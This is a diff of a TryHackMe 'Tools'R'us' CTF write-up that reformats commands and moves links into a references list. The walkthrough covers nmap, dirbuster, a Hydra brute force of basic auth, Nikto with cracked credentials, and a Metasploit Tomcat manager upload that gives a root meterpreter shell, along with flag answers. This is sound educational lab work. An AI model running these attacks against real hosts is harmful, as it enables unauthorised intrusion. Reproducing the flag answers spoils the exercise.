@@ -3,10 +3,10 @@
 We're supposed to restrict ourselves to the following tools in this CTF:
 
 * dirbuster
-* [Hydra](hydra.md)
-* [nmap](nmap.md)
-* [Nikto](nikto.md)
-* [Metasploit](metasploit.md)
+* Hydra
+* nmap
+* Nikto
+* Metasploit
 
 It's been a little while since I had the chance to use some of these, so let's find out how rusty I am!
 
@@ -14,10 +14,11 @@ It's been a little while since I had the chance to use some of these, so let's f
 
 The target is at 10.10.28.154. Visiting http://10.10.28.154 reveals a "down for maintenance" page with no other links, but with the cryptic promise that "[o]ther parts of ther website is [sic] still functional..."
 
-We'll start off with an [nmap](nmap.md) scan.
+We'll start off with an nmap scan.
 
 ```bash
-sudo nmap -v -oA tools-r-us -Pn -A -T4 -sS -script vuln -p- 10.10.28.154
+sudo nmap -v -oA tools-r-us -Pn -A -T4 -sS -script vuln \
+          -p- 10.10.28.154
 ```
 
 This gives the following output:
@@ -282,7 +283,7 @@ OS and Service detection performed. Please report any incorrect results at https
 
 So, we've got the following ports:
 
-* 22: OpenSSH ([nmap](nmap.md) says it's 7.2p2, but connecting to it directly reveals it to be 8.7p1)
+* 22: OpenSSH (nmap says it's 7.2p2, but connecting to it directly reveals it to be 8.7p1)
 * 80: Apache httpd 2.4.18
 * 1234: Apache Tomcat + Coyote 1.1
 * 8009: Apache Jserv 1.3
@@ -297,10 +298,12 @@ No obvious exploits here, but this is enough information to get us a few flags.
 * FLAG 8: What is the server version (run the scan against port 80)? -- `Apache/2.4.18`
 * FLAG 9: What version of Apache-Coyote is this service using? -- `1.1`
 
-We'll also run a scan with dirbuster (normally I use [gobuster](gobuster.md), but I'm trying to operate in the spirit of this CTF):
+We'll also run a scan with dirbuster (normally I use gobuster, but I'm trying to operate in the spirit of this CTF):
 
 ```bash
-dirbuster -l /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.28.154
+dirbuster \
+	-l /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+	-u http://10.10.28.154
 ```
 
 This finds the following directories:
@@ -321,14 +324,16 @@ Going to this directory reveals a single message:
 Hey <b>bob</b>, did you update that TomCat server?
 ```
 
-So, that kinda does imply that Tomcat or Coyote might be vulnerable, even though I couldn't find anything obvious on [Exploit DB](https://www.exploit-db.com). I'll come back to that, since we have another flag.
+So, that kinda does imply that Tomcat or Coyote might be vulnerable, even though I couldn't find anything obvious on Exploit DB. I'll come back to that, since we have another flag.
 
 * FLAG 2: Whose name can you find from this directory? -- `bob`
 
-We'll deploy [Hydra](hydra.md) against the http-basic authentication protecting `/protected/`. I've never done this before, but a quick internet search reveals this [potentially useful guide](http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/), as well as an additional walk-through clarifying [how to use Hydra to crack Apache conf-based http-basic authentication](https://www.hackingarticles.in/multiple-ways-to-exploiting-http-authentication/). With this information in hand, we should (hopefully) be able to crack Bob's password using the following:
+We'll deploy Hydra against the http-basic authentication protecting `/protected/`. I've never done this before, but a quick internet search reveals this potentially useful guide, as well as an additional walk-through clarifying how to use Hydra to crack Apache conf-based http-basic authentication. With this information in hand, we should (hopefully) be able to crack Bob's password using the following:
 
 ```bash
-hydra -l bob -P ~/.local/share/red-team/wordlists/rockyou.txt -f -vV http-get://10.10.28.154/protected/
+hydra -l bob \
+      -P ~/.local/share/red-team/wordlists/rockyou.txt \
+      -f -vV http-get://10.10.28.154/protected/
 ```
 
 This gets us another flag!
@@ -338,22 +343,24 @@ This gets us another flag!
 While it probably won't get us any more flags, I'm kinda curious what's in `/protected/`. Unfortunately, the experience is kinda anti-climatic.
 
 ```html
-<center></br> <img width=150 src="[protected.png](view-source:http://10.10.28.154/protected/protected.png)"> <p>This protected page has now moved to a different port.</p> </center>
+<center></br> <img width=150 src="protected.png"> <p>This protected page has now moved to a different port.</p> </center>
 ```
 
 Oh well.
 
-The CTF does direct us to look at http://10.10.28.154:1234/manager/html (using Bob's password); that's just the Tomcat documentation by the looks of it. But if we throw [Nikto](nikto.md) against it, we can get ourselves another flag.
+The CTF does direct us to look at http://10.10.28.154:1234/manager/html (using Bob's password); that's just the Tomcat documentation by the looks of it. But if we throw Nikto against it, we can get ourselves another flag.
 
 ```bash
-nikto -Format txt -host http://10.10.28.154:1234/manager/html -id bob:bubbles -nossl -output tools-r-us.txt
+nikto -Format txt \
+      -host http://10.10.28.154:1234/manager/html \
+      -id bob:bubbles -nossl -output tools-r-us.txt
 ```
 
-The next flag is just looking for the number of "Tomcat documentation" files [Nikto](nikto.md) finds. Unfortunately, these don't get spit out until near the end of [Nikto](nikto.md)'s run, so expect to wait a *long* time!
+The next flag is just looking for the number of "Tomcat documentation" files Nikto finds. Unfortunately, these don't get spit out until near the end of Nikto's run, so expect to wait a *long* time!
 
 * FLAG 7: How many documentation files did Nikto identify? -- `5`
 
-Alright, let's switch over to our last two flags, which imply that we can get RCE on this version of Tomcat. It looks like [Apache Tomcat 7.0.88 was released on May 16, 2018](https://tomcat.apache.org/security-7.html#Fixed_in_Apache_Tomcat_7.0.88). There's no obvious *vulnerability* to exploit for this version, but after searching around a bit on the net I found a guide mentioning that [RCE on Tomcat could be obtained via the "manager" application](https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/). And, indeed, looking at the info for the corresponding module in [Metasploit](metasploit.md) (`exploit/multi/http/tomcat_mgr_upload`) reveals that we can obtain RCE if we have access to the `/manager/html/upload` component. Which we *do*, because `/manager/html` has the option to "Select WAR file to upload".
+Alright, let's switch over to our last two flags, which imply that we can get RCE on this version of Tomcat. It looks like Apache Tomcat 7.0.88 was released on May 16, 2018. There's no obvious *vulnerability* to exploit for this version, but after searching around a bit on the net I found a guide mentioning that RCE on Tomcat could be obtained via the "manager" application. And, indeed, looking at the info for the corresponding module in Metasploit (`exploit/multi/http/tomcat_mgr_upload`) reveals that we can obtain RCE if we have access to the `/manager/html/upload` component. Which we *do*, because `/manager/html` has the option to "Select WAR file to upload".
 
 Now, `exploit/multi/http/tomcat_mgr_upload` only targets 32-bit Linux, and the server is running a 64-bit build (this can also be found in `/manager/html/`), so we'll use the "Java Universal" target.
 
@@ -367,11 +374,11 @@ set LHOST 10.13.26.40
 exploit
 ```
 
-And we have a [meterpreter](metasploit.md) shell! Running `getuid` reveals that we're also running as `root`. Ouch.
+And we have a meterpreter shell! Running `getuid` reveals that we're also running as `root`. Ouch.
 
 * FLAG 10: What user did you get a shell as? -- `root`
 
-We'll just drop to `shell` in [meterpreter](metasploit.md) to get the contents of `/root/flag.txt`.
+We'll just drop to `shell` in meterpreter to get the contents of `/root/flag.txt`.
 
 * FLAG 11: What text is in the file /root/flag.txt? -- `ff1fc4a81affcc7688cf89ae7dc6e0e1`
 
@@ -380,6 +387,16 @@ ELAPSED TIME: 3 h 7 min
 ## References
 
 * [TryHackMe: Tools'R'us](https://tryhackme.com/room/toolsrus)
+* [Using Hydra](hydra.md)
+* [Using “nmap”](nmap.md)
+* [Using Nikto](nikto.md)
+* [Using Metasploit](metasploit.md)
+* [Using “gobuster”](gobuster.md)
+* [Exploit Database](https://www.exploit-db.com)
+* [Defeating HTTP Basic Auth with Hydra](http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/)
+* [Multiple Ways To Exploiting HTTP Authentication](https://www.hackingarticles.in/multiple-ways-to-exploiting-http-authentication/)
+* [Apache Tomcat 7.x vulnerabilities](https://tomcat.apache.org/security-7.html)
+* [Multiple Ways to Exploit Tomcat Manager](https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/)
 
 - - - -
 
